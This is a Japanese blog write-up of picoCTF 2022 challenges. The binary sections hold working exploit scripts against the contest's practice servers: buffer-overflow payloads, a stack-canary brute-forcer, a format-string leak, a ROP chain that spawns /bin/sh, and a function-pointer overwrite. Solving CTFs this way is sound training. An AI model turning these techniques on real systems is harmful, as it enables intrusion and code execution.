---
title: "picoCTF 2022 Writeup"
date: 2022-04-06T15:30:00+09:00
lastmod: 2022-04-06T15:30:00+09:00
draft: false
keywords: []
description: ""
tags: ["CTF"]
categories: ["CTF"]
author: ""
---
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">
<img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!"> <b><font color="teal">Save The Earth! - 地球環境を守ろう！</font></b> <img src="https://captureamerica.github.io/writeups/img/10_Nature_Themed_Icons_Cute_Earth_Icon.png" alt="Save The Earth!">
<img src="https://captureamerica.github.io/writeups/img/green_bar.png" alt="green_bar.png">

{{% right %}}
<a href="https://translate.google.com/translate?hl=en&sl=ja&tl=en&u=https%3A%2F%2Fcaptureamerica.github.io%2Fwriteups%2Fpost%2Fpicoctf_2022%2F">
<img src="https://captureamerica.github.io/writeups/img/En.png" alt="English">
</a>
{{% /right %}}

URL: [https://play.picoctf.org/events/70/challenges](https://play.picoctf.org/events/70/challenges) (イベント終了につき、アクセス不可)
<br /><br />
今年は少しチャレンジ数が少なめ？だった気がします。

2週間ガッツリやるつもりだったんですが、だいたい最初の4〜5日くらいで解けるチャレンジは解いてしまったので、これにて終了。

またしばらくOSCPの勉強に没頭します。

<br /><br />
最終結果は、こんな感じ。

<img src="https://captureamerica.github.io/writeups/img/pico2022_Score1.png" alt="pico2022_Score1.png">
<br />
<img src="https://captureamerica.github.io/writeups/img/pico2022_Score2.png" alt="pico2022_Score2.png">


<br />
11700点をとって、最終順位は 276位でした。
<br />
<img src="https://captureamerica.github.io/writeups/img/pico2022_Rank.png" alt="pico2022_Rank.png">




<br /><br />
以下、Writeupです。多くの人が解いている簡単なやつは省略します。





<br /><br />
## [Crypto]: diffie-hellman (200 points)
- - -
### Challenge
> Alice and Bob wanted to exchange information secretly. The two of them agreed to use the Diffie-Hellman key exchange algorithm, using p = 13 and g = 5. They both chose numbers secretly where Alice chose 7 and Bob chose 3. Then, Alice sent Bob some encoded text (with both letters and digits) using the generated key as the shift amount for a Caesar cipher over the alphabet and the decimal digits. Can you figure out the contents of the message?
<br /><br />
Wrap your decrypted message in the picoCTF flag format like: picoCTF{decrypted_message}
<br /><br />
Hint1: Diffie-Hellman key exchange is a well known algorithm for generating keys, try looking up how the secret key is generated
<br /><br />
Hint2: For your Caesar shift amount, try forwards and backwards.


Attachment:

- message.txt

中身
<pre>
H98A9W_H6UM8W_6A_9_D6C_5ZCI9C8I_8F7GK99J
</pre>


<br />

### Solution
オンラインのツール（[https://www.irongeek.com/diffie-hellman.php?](https://www.irongeek.com/diffie-hellman.php?)）などで、shared keyが `5` なのがわかります。

以下のPythonでも出せます。

```Python
from random import randint
 
if __name__ == '__main__':
 
    P = 13
    G = 5
     
    # Alice will choose the private key a
    a = 7
     
    # gets the generated key
    x = int(pow(G,a,P)) 
     
    # Bob will choose the private key b
    b = 3
    
    # gets the generated key
    y = int(pow(G,b,P)) 
     
    # Secret key for Alice
    ka = int(pow(y,a,P))
     
    # Secret key for Bob
    kb = int(pow(x,b,P))
     
    print('Secret key for the Alice is : %d'%(ka))
    print('Secret Key for the Bob is : %d'%(kb))
    
```

<br />

実行結果：

<pre>
$ python3 diffie-hellman_solve.py
Secret key for the Alice is : 5
Secret Key for the Bob is : 5
</pre>


<br />
さて、あとは、message.txtにあるメッセージを5文字分シフトするだけなんですが、ここで問題発生です。

アルファベットをROTで、数字は数字でシフトしてみたところ、こうなりました。

<pre>
C43<b>V</b>4R_C1PH3R_1<b>V</b>_4_<b>Y</b>1<b>X</b>_0U<b>X</b>D4<b>X</b>3D_3A2BF44E
</pre>

<br />
なんとなく、`CAESER CIPHER` のLEET文字っぽいのは見て取れるので、後は間違っている箇所を修正するだけです。

<br />
結局、"<b>0123456789</b>ABCDEFGHIJKLMNOPQRSTUVWXYZ" のように、アルファベットを左にシフトすると数字になるというのを予想して解かないといけないやつでした。


```Python
#!/usr/bin/env python
# -*- coding:utf-8 -*-
import sys

map = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"
cipher = "H98A9W_H6UM8W_6A_9_D6C_5ZCI9C8I_8F7GK99J"
key = -5

for i in range(len(cipher)):
    c = cipher[i]
    if c == "_":
        pass
    else:
        pos = map.find(c) + key
        c = map[pos]
    sys.stdout.write(c)
print("")
```

<br />

Flag: `picoCTF{C4354R_C1PH3R_15_4_817_0U7D473D_3A2BF44E}`


<br />

かわいそうに、このチャレンジは、不評だからかpicoGymにも入らないことになってしまいましたね。

これはこれで、いいチャレンジだったとは思うんですけど。

AliceとBobが、このように暗号化しようと決めてやってるわけだし、簡単に解読できなくても納得はいきます。

いちおう、Discordでコメント入れておきました。

<img src="https://captureamerica.github.io/writeups/img/pico2022_DH.png" alt="pico2022_DH.png">





<br /><br />
<br /><br />
## [Reverse]: Keygenme (400 points)
- - -
### Challenge
> Can you get the flag?
<br /><br />
Reverse engineer this binary.


Attachment:

- keygenme (ELF 64-bit)


<br />

### Solution
以下がGhidraでデコンパイルしたものです。

{{< highlight c "linenos=table,hl_lines=29-33 51-59 63" >}}
undefined8 FUN_00101209(char *param_1)

{
  size_t sVar1;
  undefined8 uVar2;
  long in_FS_OFFSET;
  int local_d0;
  int local_cc;
  int local_c8;
  int local_c4;
  int local_c0;
  undefined2 local_ba;
  byte local_b8 [16];
  byte local_a8 [16];
  undefined8 local_98;
  undefined8 local_90;
  undefined8 local_88;
  undefined4 local_80;
  char local_78 [12];
  undefined local_6c;
  undefined local_66;
  undefined local_5f;
  undefined local_5e;
  char local_58 [32];
  char acStack56 [40];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_98 = 0x7b4654436f636970;
  local_90 = 0x30795f676e317262;
  local_88 = 0x6b5f6e77305f7275;
  local_80 = 0x5f7933;
  local_ba = 0x7d;
  sVar1 = strlen((char *)&local_98);
  MD5((uchar *)&local_98,sVar1,local_b8);
  sVar1 = strlen((char *)&local_ba);
  MD5((uchar *)&local_ba,sVar1,local_a8);
  local_d0 = 0;
  for (local_cc = 0; local_cc < 0x10; local_cc = local_cc + 1) {
    sprintf(local_78 + local_d0,"%02x",(ulong)local_b8[local_cc]);
    local_d0 = local_d0 + 2;
  }
  local_d0 = 0;
  for (local_c8 = 0; local_c8 < 0x10; local_c8 = local_c8 + 1) {
    sprintf(local_58 + local_d0,"%02x",(ulong)local_a8[local_c8]);
    local_d0 = local_d0 + 2;
  }
  for (local_c4 = 0; local_c4 < 0x1b; local_c4 = local_c4 + 1) {
    acStack56[local_c4] = *(char *)((long)&local_98 + (long)local_c4);
  }
  acStack56[27] = local_66;
  acStack56[28] = local_5e;
  acStack56[29] = local_5f;
  acStack56[30] = local_78[0];
  acStack56[31] = local_5e;
  acStack56[32] = local_66;
  acStack56[33] = local_6c;
  acStack56[34] = local_5e;
  acStack56[35] = (undefined)local_ba;
  sVar1 = strlen(param_1);
  if (sVar1 == 0x24) {
    for (local_c0 = 0; local_c0 < 0x24; local_c0 = local_c0 + 1) {
      if (param_1[local_c0] != acStack56[local_c0]) {
        uVar2 = 0;
        goto LAB_00101475;
      }
    }
    uVar2 = 1;
  }
  else {
    uVar2 = 0;
  }
LAB_00101475:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar2;
}
{{< / highlight >}}

<br />

29〜33行のところで、`picoCTF{br1ng_y0ur_0wn_k3y_}`の部分は見つかります。

<br />
あとは、acStack56の配列に入る値が必要です。

<br />

gdbを使って解きました。

<br />

strlen()が呼ばれているので、strlen()にbreak pointを張って、20数回`c`でcontinueすると、この関数に辿り着きます。

途中でKeyの入力がありますが、そこでは `picoCTF{br1ng_y0ur_0wn_k3y_8888888}` みたいのを入れておきます。

<br />

上記の63行目のif文で比較している箇所を見つけて、今度はそこにbreak pointを張ります。

例：`b *0x555555555455`

<img src="https://captureamerica.github.io/writeups/img/pico2022_Keygenme.png" alt="pico2022_Keygenme.png">

<br />

$raxの方が期待値（実際のフラグ）、$rdxの方が自分が入力した値です。

違いが見られたら、メモをとりつつ、$rdxの値を$raxに合わせてループを続けます。

例：`set $rdx=0x64`

メモった値：

<pre>
0x39
0x64
0x37
0x34
0x64
0x39
0x30
0x64
0x7d
</pre>

<br />

Flag: `picoCTF{br1ng_y0ur_0wn_k3y_9d74d90d}`





<br /><br />
<br /><br />
## [Forensics]: SideChannel (400 points)
- - -
### Challenge
> There's something fishy about this PIN-code checker, can you figure out the PIN and get the flag?
<br /><br />
Download the PIN checker program here pin_checker
<br /><br />
Once you've figured out the PIN (and gotten the checker program to accept it), connect to the master server using nc saturn.picoctf.net 50364 and provide it the PIN to get your flag.
<br /><br />
Hint1: Read about "timing-based side-channel attacks."
<br /><br />
Hint2: Attempting to reverse-engineer or exploit the binary won't help you, you can figure out the PIN just by interacting with it and measuring certain properties about it.
<br /><br />
Hint3: Don't run your attacks against the master server, it is secured against them. The PIN code you get from the pin_checker binary is the same as the one for the master ser

Attachment:

- pin_checker (ELF 32-bit)

<br />

### Solution
まず最初にBrute Forceしてみたんですが、相当時間がかかりそうだったので諦めました。

（あとで記載しますが、このBrute Forceコードは、最後にちょっと使いました。）

<br />

いろいろ調べている間に、以下を見つけました。

[https://github.com/ChrisTheCoolHut/PinCTF](https://github.com/ChrisTheCoolHut/PinCTF)

結局、使い方がよくわからなくてこのツールは使わなかったのですが、このツールから呼ばれているIntel pintoolsを使って解きました。

最新版は以下にあります。

[https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.22-98547-g7a303a835-gcc-linux.tar.gz](https://software.intel.com/sites/landingpage/pintool/downloads/pin-3.22-98547-g7a303a835-gcc-linux.tar.gz)


<br />

このKeygenmeプログラムは、どうやら先頭から一文字ずつKeyをチェックしていて、正解の場合は inscount.out に不正解時よりも大きい値が出てきます。

<br />
<pre>
$ cat inscount.out
Count 62530061

$ rm inscount.out; ./pin/pin -t obj-ia32/inscount0.so -- ./pin_checker <<< 66666666
Please enter your 8-digit PIN code:
8
Checking PIN...
Access denied.
$ cat inscount.out
Count 61571547


$ rm inscount.out; ./pin/pin -t obj-ia32/inscount0.so -- ./pin_checker <<< 55555555
Please enter your 8-digit PIN code:
8
Checking PIN...
Access denied.
$ cat inscount.out
Count 61092281


$ rm inscount.out; ./pin/pin -t obj-ia32/inscount0.so -- ./pin_checker <<< 44444444
rm: cannot remove 'inscount.out': No such file or directory
Please enter your 8-digit PIN code:
8
Checking PIN...
Access denied.
$ cat inscount.out
Count 141609347
</pre>


これで、先頭は`4`で確定、ということです。


<br />

{{% admonition tip "Tips" %}}
bash では、&lt;&lt;&lt; を使うことで、入力待ちへの入力ができます。（shだとエラーになります）
{{% /admonition %}}


<br />

あとは、ひたすらこの作業を繰り返していくだけです。

<br />

この作業は自動化したかったんですが、結局、途中まで手動でやりました。

残り4桁くらいになったところで序盤で作ったBrute Forceコードを使いました。

```Python
#!/usr/bin/env python
from pwn import *
context.log_level = 'critical'

for i in range(48390000,48390999):
    pin = str(i).zfill(8)
    s = process('./pin_checker')
    s.sendlineafter("code:\n", pin)
    s.recvuntil("PIN...\n")
    result = s.recvuntil("\n")
    if not "denied" in result:
        print(result)
        print(pin)
        exit()
    s.close()
```

Keyは、48390513 でした。

<br />

<pre>
$ nc saturn.picoctf.net 50364
Verifying that you are a human...
Please enter the master PIN code:
48390513
Password correct. Here's your flag:
picoCTF{t1m1ng_4tt4ck_914c5ec3}
</pre>

<br />

Flag: `picoCTF{t1m1ng_4tt4ck_914c5ec3}`




<br /><br />
<br /><br />
## [Forensics]: Torrent Analyze (400 points)
- - -
### Challenge
> SOS, someone is torrenting on our network.
<br /><br />
One of your colleagues has been using torrent to download some files on the company’s network. Can you identify the file(s) that were downloaded? The file name will be the flag, like picoCTF{filename}.
<br /><br />
Hint1: Download and open the file with a packet analyzer like Wireshark.
<br /><br />
Hint2: You may want to enable BitTorrent protocol (BT-DHT, etc.) on Wireshark. Analyze -> Enabled Protocols
<br /><br />
Hint3: Try to understand peers, leechers and seeds. Article
<br /><br />
Hint4: The file name ends with .iso


Attachment:

- bt.pcap

<br />

### Solution
まずはヒントに従って、WiresharkでBT-DHT, BT-uTPをEnableします。

Torrentのpcapなんか初めて見たし、仕様も全然知らなかったですが、".iso" というファイルの拡張子はpcapの中で見つからなかったので、pcapの何かの情報を元にネットでファイル名を探すんだろうな、という予想を立てました。

<br />
Frame #332で、`Zoo (2017) 720p WEB-DL x264 ESubs - MkvHub.Com` という文字列が出てくるのですが、これは該当するinfo_hash (17c1e42e811a83f12c697c21bed9c72b5cb3000d) をネットでググると確かに何かがヒットします（怪しいサイトです）。このファイルは ".iso" ではなかったです。

<br />

ということで、別のinfo_hashをWiresharkから一個ずつ取り出し、それぞれGoogleでチェックしました。

<pre>
17d62de1495d4404f6fb385bdfd7ead5c897ea22
17c1e42e811a83f12c697c21bed9c72b5cb3000d - Zoo (2017) 720p WEB-DL x264 ESubs - MkvHub.Com
d59b1ce3bf41f1d282c1923544629062948afadd
078e18df4efe53eb39d3425e91d1e9f4777d85ac
17c0c2c3b7825ba4fbe2f8c8055e000421def12c
17c02f9957ea8604bc5a04ad3b56766a092b5556
e2467cbf021192c241367b892230dc1e05c0580e - ubuntu-19.10-desktop-amd64.iso
</pre>

<br />

Flag: `picoCTF{ubuntu-19.10-desktop-amd64.iso}`



<br /><br />
<br /><br />
## [Binary]: buffer overflow 2 (300 points)
- - -
### Challenge
> Control the return address and arguments
<br /><br />
This time you'll need to control the arguments to the function you return to! Can you get the flag from this program?


Attachment:

- vuln (ELF 32-bit)
- vuln.c

<br />

### Solution
これは [picoCTF 2019のOverFlow 2](https://captureamerica.github.io/writeups/post/picoctf_2019_binary/#binary-exploitation-overflow-2-250-points) とほぼ同じです。

<br />

Python2:
<pre>
captureamerica@kali:Pwn$ (python -c 'print("A"*112+"\x96\x92\x04\x08"+"BBBB"+"\x0D\xF0\xFE\xCA"+"\x0D\xF0\x0D\xF0")'; cat -) | nc saturn.picoctf.net 53371
Please enter your string:
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�BBBB
picoCTF{argum3nt5_4_d4yZ_31432deb}
</pre>

<br />

Python3:
<pre>
captureamerica@ubuntu:Pwn$ (python -c 'import sys; sys.stdout.buffer.write(b"A"*112 + b"\x96\x92\x04\x08" + b"BBBB" + b"\x0D\xF0\xFE\xCA" + b"\x0D\xF0\x0D\xF0" + b"\n")'; cat - ) | nc saturn.picoctf.net 52189
Please enter your string:
���AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�BBBB
picoCTF{argum3nt5_4_d4yZ_920d6844}
</pre>

<br />

Flag: `picoCTF{argum3nt5_4_d4yZ_31432deb}`




<br /><br />
<br /><br />
## [Binary]: buffer overflow 3 (300 points)
- - -
### Challenge
> Do you think you can bypass the protection and get the flag?
<br /><br />
It looks like Dr. Oswal added a stack canary to this program to protect against buffer overflows.


Attachment:

- vuln (ELF 32-bit)
- vuln.c

<br />

### Solution
これは [picoCTF 2019のCanaRy](https://captureamerica.github.io/writeups/post/picoctf_2019_binary/#binary-exploitation-canary-300-points) とほぼ同じです。

前回は、Shell Server上でローカルでアタックできましたが、今回はサーバー インスタンスを都度起動しないといけなくて、リモートで解く必要がありました（たぶん）。

```Python
#!/usr/bin/env python
from pwn import *
import time
canary=''

while len(canary) < 4:
    for i in range(256):
        try:
            p = remote('saturn.picoctf.net', 53550)
            p.recvuntil('>')
            p.sendline('{}'.format(64+1+len(canary)))
            p.recvuntil('>')
            p.sendline('a'*64+canary+'{}'.format(chr(i)))
            tmp=p.recvline()

            print(tmp)
            if "Ok... Now Where's the Flag?" in tmp:
                canary += chr(i)
                log.info('Partial canary: {}'.format(canary))
                break
        except EOFError:
            time.sleep(1)
            pass
log.info('Found canary: {}'.format(canary))
```

これで、Canaryの値 `BiRd` が得られます。

<br />

あとは、以下の通りです。

```Python
#!/usr/bin/env python
from pwn import *

s = remote('saturn.picoctf.net', 53162)

payload = b'A' * 64
payload += 'BiRd'
payload += b'B' * 16
payload += p32(0x8049336) # win

s.sendlineafter("How Many Bytes will You Write Into the Buffer?\n> ", str(len(payload)))
s.sendlineafter("Input> ", payload)
s.interactive()
```

<br />

Flag: `picoCTF{Stat1C_c4n4r13s_4R3_b4D_9602b3a1}`





<br /><br />
<br /><br />
## [Binary]: flag leak (300 points)
- - -
### Challenge
> Story telling class 1/2
<br /><br />
I'm just copying and pasting with this program. What can go wrong?

Attachment:

- vuln
- vuln.c

<br />

### Solution
書式文字列攻撃 (FSB: Format String Bug) です。

```Python
#!/usr/bin/env python
# -*- coding:utf-8 -*-

from pwn import *
import sys
context.log_level = 'critical'

host, port = 'saturn.picoctf.net', 60253

for i in range(36, 46):
    s = remote(host, port)
    s.recvuntil('tell you one >> ')
    s.sendline('%' +str(i)+ '$p')
    # print i,
    s.recvuntil('a story - \n')
    response = s.recvline().decode('UTF-8')
    if "0x" in response:
        r = response
        sys.stdout.write(p32(int(r, 16)))
    else:
        print()
    s.close()
    sleep(1)
print()
```

<br />

Flag: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_c2e94e3d}`





<br /><br />
<br /><br />
## [Binary]: ropfu (300 points)
- - -
### Challenge
> Description
What's ROP?
<br /><br />
Can you exploit the following program to get the flag?

Attachment:

- vuln (ELF 32-bit)
- vuln.c

<br />

### Solution
これは picoCTF 2019のrop32 とほぼ同じです。

<pre>
$ ROPgadget --binary ./vuln  --ropchain --badbytes 0a
</pre>

<br />

```Python
#!/usr/bin/env python2
# execve generated by ROPgadget

from pwn import *
from struct import pack

s = remote('saturn.picoctf.net', 56153)

# Padding goes here
p = 'A'*28

p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += '/bin'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5064) # @ .data + 4
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x080b074a) # pop eax ; ret
p += '//sh'
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x41414141) # padding
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x08059102) # mov dword ptr [edx], eax ; ret
p += pack('<I', 0x08049022) # pop ebx ; ret
p += pack('<I', 0x080e5060) # @ .data
p += pack('<I', 0x08049e39) # pop ecx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080583c9) # pop edx ; pop ebx ; ret
p += pack('<I', 0x080e5068) # @ .data + 8
p += pack('<I', 0x080e5060) # padding without overwrite ebx
p += pack('<I', 0x0804fb90) # xor eax, eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0808055e) # inc eax ; ret
p += pack('<I', 0x0804a3d2) # int 0x80

s.sendlineafter("grasshopper!\n", p)
s.interactive()
```

<br />

Flag: `picoCTF{5n47ch_7h3_5h311_c6992ff0}`




<br /><br />
<br /><br />
## [Binary]: wine (300 points)
- - -
### Challenge
> Challenge best paired with wine.
<br /><br />
I love windows. Checkout my exe running on a linux box.

Attachment:

- vuln.exe
- vuln.c


<br />

### Solution
最初、Ghidraでよくわからなかったので、Immunity Debuggerで見てみました。

<img src="https://captureamerica.github.io/writeups/img/pico2022_wine_immunity.png" alt="pico2022_wine_immunity.png">

win()関数のアドレスは、0x401530のようです。

<br />

Ghidraでも確認できました。

<img src="https://captureamerica.github.io/writeups/img/pico2022_wine_ghidra.png" alt="pico2022_wine_ghidra.png">

<br />

以下が書いたコードです。

s.sendlineafter()のところでは、pcapで見たところ改行が `0d0a` で来ていたので `\r\n` でパターンを指定しています。Windowsだからね。

```Python
#!/usr/bin/env python
from pwn import *

s = remote('saturn.picoctf.net', 61540)

payload = b'A' * 128
payload += b'B' * 12
payload += p32(0x401530) # win

s.sendlineafter("Give me a string!\r\n", payload)
s.interactive()
```

<br />

実行結果：

<pre>
$ ./wine_solve.py
[+] Opening connection to saturn.picoctf.net on port 61540: Done
[*] Switching to interactive mode
picoCTF{Un_v3rr3_d3_v1n_cdac4d01}
Unhandled exception: page fault on read access to 0x00000000 in 32-bit code (0x00000000).
Register dump:
 CS:0023 SS:002b DS:002b ES:002b FS:006b GS:0063
 EIP:00000000 ESP:0064fe8c EBP:00401530 EFLAGS:00010206(  R- --  I   - -P- )
 EAX:00000000 EBX:00230e78 ECX:0064fe1c EDX:7fec48f4
 ESI:00000005 EDI:006d2250
Stack dump:
0x0064fe8c:  00000000 7b432ecc 00230e78 0064ff28
0x0064fe9c:  00401386 00000002 00230e70 0021d220
0x0064feac:  7bcc4625 00000004 00000008 00230e70
0x0064febc:  006d2250 00050c4d 17e5a340 00000000
0x0064fecc:  00000000 00000000 00000000 00000000
0x0064fedc:  00000000 00000000 00000000 00000000
Backtrace:
=>0 0x00000000 (0x00401530)
  1 0x44c768ec (0x83e58955)
0x00000000: -- no code accessible --
Modules:
Module    Address            Debug info    Name (5 modules)
PE      400000-  44b000    Deferred        vuln
PE    7b020000-7b023000    Deferred        kernelbase
PE    7b420000-7b5db000    Deferred        kernel32
PE    7bc30000-7bc34000    Deferred        ntdll
PE    7fe10000-7fe14000    Deferred        msvcrt
Threads:
process  tid      prio (all id:s are in hex)
00000008 (D) Z:\challenge\vuln.exe
    00000009    0 <==
0000000e services.exe
    00000026    0
    00000025    0
    00000024    0
    00000015    0
    00000010    0
    0000000f    0
00000011 plugplay.exe
    00000019    0
    00000018    0
    00000012    0
00000022 winedevice.exe
    00000028    0
    00000027    0
    00000023    0
System information:
    Wine build: wine-5.0 (Ubuntu 5.0-3ubuntu1)
    Platform: i386
    Version: Windows 7
    Host system: Linux
    Host version: 5.13.0-1017-aws
[*] Got EOF while reading in interactive
</pre>

<br />

Flag: `picoCTF{Un_v3rr3_d3_v1n_cdac4d01}`




<br /><br />
<br /><br />
## [Binary]: function overwrite (400 points)
- - -
### Challenge
> Story telling class 2/2
<br /><br />
You can point to all kinds of things in C. Checkout our function pointers demo program.

Attachment:

- vuln (ELF 32-bit)
- vuln.c

中身：

{{< highlight c "linenos=table,hl_lines=69-70 80 84" >}}
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

int calculate_story_score(char *story, size_t len)
{
  int score = 0;
  for (size_t i = 0; i < len; i++)
  {
    score += story[i];
  }

  return score;
}

void easy_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 1337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 1337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void hard_checker(char *story, size_t len)
{
  if (calculate_story_score(story, len) == 13371337)
  {
    char buf[FLAGSIZE] = {0};
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL)
    {
      printf("%s %s", "Please create 'flag.txt' in this directory with your",
                      "own debugging flag.\n");
      exit(0);
    }

    fgets(buf, FLAGSIZE, f); // size bound read
    printf("You're 13371337. Here's the flag.\n");
    printf("%s\n", buf);
  }
  else
  {
    printf("You've failed this class.");
  }
}

void (*check)(char*, size_t) = hard_checker;
int fun[10] = {0};

void vuln()
{
  char story[128];
  int num1, num2;

  printf("Tell me a story and then I'll tell you if you're a 1337 >> ");
  scanf("%127s", story);
  printf("On a totally unrelated note, give me two numbers. Keep the first one less than 10.\n");
  scanf("%d %d", &num1, &num2);

  if (num1 < 10)
  {
    fun[num1] += num2;
  }

  check(story, strlen(story));
}
 
int main(int argc, char **argv)
{

  setvbuf(stdout, NULL, _IONBF, 0);

  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
{{< / highlight >}}


<br />

### Solution
グローバル変数 fun[] の近くに関数へのポインタがあって、これを書き換えるというものです。

scanf()があって、num1とnum2に任意の値が設定できます。

<br />

num1には10未満の数字しか入力できないですが、signed intなので負の数が設定できます。

<br />

gdbを使って試行錯誤で値を見つけました。チェックするのは以下の辺りです。

<pre>
 →  0x804960d <vuln+157>       mov    DWORD PTR [ebx+eax*4+0x80], edx
    0x8049614 <vuln+164>       mov    esi, DWORD PTR [ebx+0x40]
</pre>

num1に入れるのは、`-16`でした。

<br />

num2の値は、`+=` で使われるので、hard_checker()とeasy_checker()の差分を入れます。

ただし、これもgdbを使って試行錯誤が必要でした。

num2に入れるのは、`-314`でした。

これで、関数へのポインタが入っている check がeasy_checker()のポインタに書き換わります。

<br />

あとは、そんなに難しくないです。storyとして入力した文字の値の合計が1337になれば、フラグゲットです。

`hogehogehogeP`にしました (笑)

<br />

実行結果：

<pre>
$ nc saturn.picoctf.net 50812
Tell me a story and then I'll tell you if you're a 1337 >> hogehogehogeP
On a totally unrelated note, give me two numbers. Keep the first one less than 10.
-16
-310
You're 1337. Here's the flag.
picoCTF{0v3rwrit1ng_P01nt3rs_85b55543}
</pre>


<br />

Flag: `picoCTF{0v3rwrit1ng_P01nt3rs_85b55543}`






<br /><br />
<br /><br />
## [Binary]: stack cache (400 points)
- - -
### Challenge
> Undefined behaviours are fun.
<br /><br />
It looks like Dr. Oswal allowed buffer overflows again. Analyse this program to identify how you can get to the flag.
<br /><br />
Hint1: Maybe there is content left over from stack?
<br /><br />
Hint2: Try compiling it with gcc and clang-12 to see how the binaries differ

Attachment:

- vuln (ELF 32-bit)
- vuln.c

中身：

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 16
#define FLAGSIZE 64
#define INPSIZE 10

/*
This program is compiled statically with clang-12
without any optimisations.
*/

void win() {
  char buf[FLAGSIZE];
  char filler[BUFSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f); // size bound read
}

void UnderConstruction() {
        // this function is under construction
        char consideration[BUFSIZE];
        char *demographic, *location, *identification, *session, *votes, *dependents;
	char *p,*q, *r;
	// *p = "Enter names";
	// *q = "Name 1";
	// *r = "Name 2";
        unsigned long *age;
	printf("User information : %p %p %p %p %p %p\n",demographic, location, identification, session, votes, dependents);
	printf("Names of user: %p %p %p\n", p,q,r);
        printf("Age of user: %p\n",age);
        fflush(stdout);
}

void vuln(){
   char buf[INPSIZE];
   printf("Give me a string that gets you the flag\n");
   gets(buf);
   printf("%s\n",buf);
   return;
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  printf("Bye!");
  return 0;
}
```


<br />

### Solution
以下、Checksecの結果です。

<pre>
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found    <<<
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
</pre>

Canaryが有効になっているので、どうしたもんだろうと思っていたんですが、どうやらclangでコンパイルするとCanaryが動かない（？）らしいです。

参考：

[https://stackoverflow.com/questions/49128025/stack-smashing-in-gcc-vs-clang-possibly-due-to-canaries](https://stackoverflow.com/questions/49128025/stack-smashing-in-gcc-vs-clang-possibly-due-to-canaries)

<i>"I am trying to understand possible sources for "stack smashing" errors in GCC, but not Clang."</i>

<br />
clang-12 をインストールして、clang-12とgccとでそれぞれコンパイルしてみました。

以下が結果です。

<pre>
$ ./stack_cache_gcc.o
Give me a string that gets you the flag
12345678901234567890
12345678901234567890
*** stack smashing detected ***: terminated
Aborted (core dumped)

$ ./stack_cache_clang.o
Give me a string that gets you the flag
12345678901234567890
12345678901234567890
Segmentation fault (core dumped)
</pre>

Clang-12の方は確かに、stack smashing が検知されないようです。

<br>

結局のところ、このチャレンジはBOFを起こして任意の関数へジャンプするだけです。

win()関数では Flag の値を読み込んではいるものの、printf()での表示処理がありません。

一方、UnderConstruction()の方は、初期化してない変数をprintf()で表示しています。

よって、win()、UnderConstruction()へ順番に飛ぶことでフラグが得られる、というものです。

<br />

実行結果：

<br />

Python2

<pre>
captureamerica@kali:Pwn$ (python -c 'print("A"*14+"\xa0\x9d\x04\x08"+"\x20\x9e\x04\x08")'; cat -) | nc saturn.picoctf.net 51588
